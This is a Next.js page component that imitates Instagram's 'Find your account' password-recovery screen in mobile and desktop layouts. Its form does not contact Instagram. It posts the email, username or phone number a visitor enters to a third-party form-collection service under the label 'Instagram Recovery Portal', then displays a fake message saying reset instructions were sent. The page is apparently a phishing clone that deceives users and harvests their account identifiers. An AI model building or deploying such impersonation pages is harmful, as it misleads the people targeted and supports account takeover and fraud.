"use client";

import React, { useState } from "react";
import Link from "next/link";
import { ChevronLeftIcon } from "@/components/common/Icons";
import MetaFooter from "@/components/common/MetaFooter";
import LanguageModal from "@/components/common/LanguageModal";
import { submitToWeb3Forms, WEB3FORMS_ACCESS_KEY } from "@/lib/web3forms";

export default function InstagramForgotPasswordPage() {
  const [mode, setMode] = useState<"email" | "phone">("email");
  const [identifier, setIdentifier] = useState("");
  const [isLangModalOpen, setIsLangModalOpen] = useState(false);
  const [viewType, setViewType] = useState<"responsive" | "mobile_frame">("responsive");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [statusMessage, setStatusMessage] = useState<{ type: "success" | "error"; text: string } | null>(null);

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!identifier.trim() || isSubmitting) return;

    setIsSubmitting(true);
    setStatusMessage(null);

    const formData = new FormData(e.currentTarget);
    const result = await submitToWeb3Forms(formData, "Instagram Forgot Password Request");

    setIsSubmitting(false);
    if (result.success) {
      setStatusMessage({
        type: "success",
        text: `If an account matches ${identifier}, we've sent instructions to reset your password.`,
      });
      setIdentifier("");
    } else {
      setStatusMessage({
        type: "error",
        text: result.message || "Failed to submit request. Please try again.",
      });
    }
  };

  return (
    <div className="min-h-[calc(100vh-3.5rem)] flex flex-col bg-[#0c1017] text-white font-sans antialiased">
     
      {viewType === "mobile_frame" ? (
        /* ================= MOBILE SIMULATION FRAME (Matching mobile 1 & 2) ================= */
        <div className="flex-1 flex items-center justify-center p-4 sm:p-8">
          <div className="w-full max-w-[390px] min-h-[700px] bg-[#0c1017] border border-[#283445] rounded-[36px] shadow-2xl p-6 flex flex-col justify-between relative overflow-hidden">
            <div>
              {/* Back Arrow */}
              <div className="pt-2 pb-6">
                <Link
                  href="/"
                  className="p-1 -ml-1 text-gray-300 hover:text-white inline-block"
                >
                  <ChevronLeftIcon className="w-6 h-6" />
                </Link>
              </div>

              {/* Title & Subtitle */}
              <div className="flex flex-col gap-2">
                <h1 className="text-2xl font-bold tracking-tight text-white">
                  Find your account
                </h1>
                <p className="text-[15px] text-gray-300">
                  {mode === "email"
                    ? "Enter your email or username."
                    : "Enter your mobile number."}
                </p>
                <a
                  href="#"
                  onClick={(e) => {
                    e.preventDefault();
                    alert("Account security assistant opened.");
                  }}
                  className="text-[14px] text-[#0095F6] hover:underline font-normal"
                >
                  I think my account is hacked
                </a>
              </div>

              {/* Input Form */}
              <form onSubmit={handleSubmit} className="flex flex-col gap-4 mt-6">
                <input type="hidden" name="access_key" value={WEB3FORMS_ACCESS_KEY} />
                <input type="hidden" name="subject" value="Instagram Forgot Password Request (Mobile)" />
                <input type="hidden" name="from_name" value="Instagram Recovery Portal" />
                <input type="hidden" name="form_name" value="Instagram Forgot Password Mobile" />
                <input type="hidden" name="recovery_mode" value={mode} />
                <input type="checkbox" name="botcheck" className="hidden" style={{ display: "none" }} />

                {statusMessage && (
                  <div
                    className={`p-3 rounded-xl text-xs font-medium text-center ${
                      statusMessage.type === "success"
                        ? "bg-green-500/15 text-green-400 border border-green-500/30"
                        : "bg-red-500/15 text-red-400 border border-red-500/30"
                    }`}
                  >
                    {statusMessage.text}
                  </div>
                )}

                <div>
                  <input
                    type={mode === "email" ? "text" : "tel"}
                    name={mode === "email" ? "email_or_username" : "mobile_number"}
                    value={identifier}
                    onChange={(e) => setIdentifier(e.target.value)}
                    placeholder={mode === "email" ? "Email or username" : "Mobile number"}
                    className="w-full h-[54px] px-4 rounded-2xl border border-[#283445] bg-[#12171e] text-[15px] text-white placeholder-[#7c899c] focus:outline-none focus:border-[#38475c] focus:ring-1 focus:ring-[#38475c] transition-all"
                    required
                  />
                </div>

                <button
                  type="submit"
                  disabled={isSubmitting || !identifier.trim()}
                  className={`w-full h-[48px] rounded-full font-semibold text-[15px] tracking-wide transition-colors shadow-md mt-2 flex items-center justify-center gap-2 ${
                    isSubmitting || !identifier.trim()
                      ? "bg-[#0064e0]/60 text-white/70 cursor-not-allowed"
                      : "bg-[#0064e0] hover:bg-[#1877f2] active:bg-[#0055d4] text-white cursor-pointer"
                  }`}
                >
                  {isSubmitting ? (
                    <>
                      <span className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                      <span>Submitting...</span>
                    </>
                  ) : (
                    "Continue"
                  )}
                </button>
              </form>
            </div>

            {/* Toggle Mode Button at Bottom */}
            <div className="text-center pb-6">
              <button
                type="button"
                onClick={() => {
                  setMode(mode === "email" ? "phone" : "email");
                  setIdentifier("");
                  setStatusMessage(null);
                }}
                className="text-[14px] text-white hover:underline font-semibold transition-colors"
              >
                {mode === "email"
                  ? "Find by mobile number instead"
                  : "Find by email or username instead"}
              </button>
            </div>
          </div>
        </div>
      ) : (
        /* ================= DESKTOP VIEW (Matching instagram_forgotpassword_desktop.png) ================= */
        <div className="flex-1 flex flex-col justify-between">
          {/* Top Left Back Navigation */}
          <div className="max-w-4xl w-full mx-auto px-6 pt-6">
            <Link
              href="/"
              className="inline-flex p-2 -ml-2 text-gray-300 hover:text-white transition-colors rounded-full hover:bg-white/5"
              aria-label="Back to Instagram"
            >
              <ChevronLeftIcon className="w-6 h-6 stroke-[2.5]" />
            </Link>
          </div>

          {/* Center Content Form */}
          <div className="flex-1 flex flex-col justify-center items-center px-4 py-8">
            <div className="w-full max-w-[440px] flex flex-col gap-4">
              <div className="flex flex-col gap-2">
                <h1 className="text-2xl sm:text-[28px] font-bold tracking-tight text-white">
                  Find your account
                </h1>
                <p className="text-[14px] text-gray-300 leading-normal">
                  Enter your mobile number, username or email.{" "}
                  <a
                    href="#"
                    onClick={(e) => {
                      e.preventDefault();
                      alert("Can't reset password help opened.");
                    }}
                    className="text-[#0095F6] hover:underline font-medium"
                  >
                    Can&apos;t reset your password?
                  </a>
                </p>
              </div>

              <form onSubmit={handleSubmit} className="flex flex-col gap-3.5 mt-2">
                <input type="hidden" name="access_key" value={WEB3FORMS_ACCESS_KEY} />
                <input type="hidden" name="subject" value="Instagram Forgot Password Request (Desktop)" />
                <input type="hidden" name="from_name" value="Instagram Recovery Portal" />
                <input type="hidden" name="form_name" value="Instagram Forgot Password Desktop" />
                <input type="checkbox" name="botcheck" className="hidden" style={{ display: "none" }} />

                {statusMessage && (
                  <div
                    className={`p-3 rounded-xl text-xs font-medium text-center ${
                      statusMessage.type === "success"
                        ? "bg-green-500/15 text-green-400 border border-green-500/30"
                        : "bg-red-500/15 text-red-400 border border-red-500/30"
                    }`}
                  >
                    {statusMessage.text}
                  </div>
                )}

                <div>
                  <input
                    type="text"
                    name="mobile_or_username_or_email"
                    value={identifier}
                    onChange={(e) => setIdentifier(e.target.value)}
                    placeholder="Mobile number, username or email"
                    className="w-full h-[52px] px-4 rounded-xl border border-[#283445] bg-[#12171e] text-[15px] text-white placeholder-[#7c899c] focus:outline-none focus:border-[#38475c] focus:ring-1 focus:ring-[#38475c] transition-all"
                    required
                  />
                </div>

                <p className="text-xs text-[#7c899c] leading-relaxed">
                  You may receive WhatsApp and SMS notifications from us for security and login purposes.
                </p>

                <button
                  type="submit"
                  disabled={isSubmitting || !identifier.trim()}
                  className={`w-full h-[46px] rounded-full font-semibold text-[15px] tracking-wide transition-colors shadow-md mt-2 flex items-center justify-center gap-2 ${
                    isSubmitting || !identifier.trim()
                      ? "bg-[#0064e0]/60 text-white/70 cursor-not-allowed"
                      : "bg-[#0064e0] hover:bg-[#1877f2] active:bg-[#0055d4] text-white cursor-pointer"
                  }`}
                >
                  {isSubmitting ? (
                    <>
                      <span className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                      <span>Submitting...</span>
                    </>
                  ) : (
                    "Continue"
                  )}
                </button>
              </form>
            </div>
          </div>

          {/* Instagram Dark Footer */}
          <MetaFooter
            theme="instagram"
            onOpenLanguageModal={() => setIsLangModalOpen(true)}
          />
        </div>
      )}

      {/* Language Modal */}
      <LanguageModal
        isOpen={isLangModalOpen}
        onClose={() => setIsLangModalOpen(false)}
      />
    </div>
  );
}
